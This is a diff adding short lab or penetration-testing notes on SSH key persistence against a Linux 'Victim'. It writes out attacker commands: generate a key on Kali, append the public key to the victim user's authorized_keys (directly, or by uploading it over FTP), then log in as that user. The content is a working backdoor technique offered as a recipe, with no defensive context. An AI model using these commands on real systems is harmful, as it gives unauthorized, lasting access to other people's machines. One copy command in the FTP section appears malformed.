@@ -1,0 +1,36 @@
+=================================== 
+Persist keys to Linux
+
+# Kali
+mkdir ~/lab/bob/.ssh/ 
+cd ~/lab/bob/.ssh/ 
+ssh-keygen -f ~/lab/bob/.ssh/id_rsa  
+id_rsa        ..private key   
+id_rsa.pub    ..public key   
+cat ~/lab/bob/.ssh/id_rsa.pub  
+
+# Victim  
+cd /home/bob/.ssh/ 
+echo ssh-rsa AAAAB3NzaC1Tz8a4ELx2k= kali@kali >> authorized_keys  
+
+# Kali  
+chmod 600 ~/lab/bob/.ssh/id_rsa 
+ssh -i ~/lab/bob/.ssh/id_rsa bob@192.168.200.5 
+
+
+=================================== 
+Persist Linux Keys via FTP
+
+cat ~/lab/bob/.ssh/id_rsa.pub ~/lab/bob/authorized_keys 
+cd ~/lab/bob/
+ftp 10.x.x.x 
+user 
+pass 
+cd bob        ..Go to bob home directory
+mkdir .ssh    ..Create new .ssh directory 
+cd .ssh 
+put authorized_keys 
+exit 
+ssh -i ~/lab/bob/.ssh/id_rsa bob@192.168.200.5 
+
+ 
